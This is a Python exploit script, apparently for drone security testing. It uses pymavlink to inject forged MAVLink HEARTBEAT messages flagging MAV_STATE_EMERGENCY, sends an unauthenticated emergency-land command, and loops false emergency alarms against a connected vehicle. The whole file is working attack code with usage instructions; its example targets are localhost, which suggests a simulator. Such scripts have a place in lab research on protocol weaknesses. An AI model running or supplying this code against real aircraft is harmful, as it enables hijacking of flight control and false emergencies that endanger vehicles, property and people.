#!/usr/bin/env python3
"""
Emergency Status Spoofing Exploit Script
Injects false emergency status flags to trigger emergency responses
"""

import sys
import time
from pymavlink import mavutil

def inject_emergency_status(connection, emergency_status=True):
    """
    Inject false emergency status
    
    Args:
        connection: MAVLink connection object
        emergency_status: True to trigger emergency, False to clear
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Emergency status is typically indicated in HEARTBEAT message
    # system_status field: MAV_STATE_EMERGENCY = 8
    
    if emergency_status:
        system_status = mavutil.mavlink.MAV_STATE_EMERGENCY
        print("[*] Injecting emergency status (MAV_STATE_EMERGENCY)")
    else:
        system_status = mavutil.mavlink.MAV_STATE_ACTIVE
        print("[*] Clearing emergency status")
    
    # Send HEARTBEAT with emergency status
    connection.mav.heartbeat_send(
        mavutil.mavlink.MAV_TYPE_QUADROTOR,  # Type
        mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,  # Autopilot
        mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED,  # Base mode
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,  # Custom mode
        system_status  # System status (EMERGENCY or ACTIVE)
    )
    
    print("[+] Emergency status injected")

def trigger_emergency_landing(connection):
    """Trigger emergency landing by sending emergency status"""
    print("[*] Triggering emergency landing...")
    inject_emergency_status(connection, emergency_status=True)
    
    # Also send LAND command
    target_system = connection.target_system
    target_component = connection.target_component
    
    connection.mav.command_long_send(
        target_system,
        target_component,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0, 0, 0, 0, 0, 0, 0, 0
    )
    print("[+] Emergency landing command sent")

def inject_false_alarm(connection):
    """Inject false emergency alarm"""
    print("[*] Injecting false emergency alarm...")
    inject_emergency_status(connection, emergency_status=True)
    time.sleep(2)
    inject_emergency_status(connection, emergency_status=False)
    print("[+] False alarm cycle completed")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 emergency_status_spoofing.py <connection> [action]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  action        Action to perform:")
        print("                trigger       Trigger emergency status")
        print("                landing       Trigger emergency landing")
        print("                false-alarm   Inject false alarm")
        print("\nExamples:")
        print("  python3 emergency_status_spoofing.py udp:127.0.0.1:14550 trigger")
        print("  python3 emergency_status_spoofing.py udp:127.0.0.1:14550 landing")
        print("  python3 emergency_status_spoofing.py udp:127.0.0.1:14550 false-alarm")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    action = sys.argv[2] if len(sys.argv) > 2 else 'trigger'
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Perform action
    if action == 'trigger':
        print("[*] Triggering emergency status (Press Ctrl+C to stop)...")
        try:
            while True:
                inject_emergency_status(connection, emergency_status=True)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping emergency status spoofing...")
    elif action == 'landing':
        trigger_emergency_landing(connection)
    elif action == 'false-alarm':
        print("[*] Injecting false alarms (Press Ctrl+C to stop)...")
        try:
            while True:
                inject_false_alarm(connection)
                time.sleep(5)
        except KeyboardInterrupt:
            print("\n[*] Stopping false alarm injection...")
    else:
        print(f"[-] Unknown action: {action}")
        sys.exit(1)

if __name__ == "__main__":
    main()
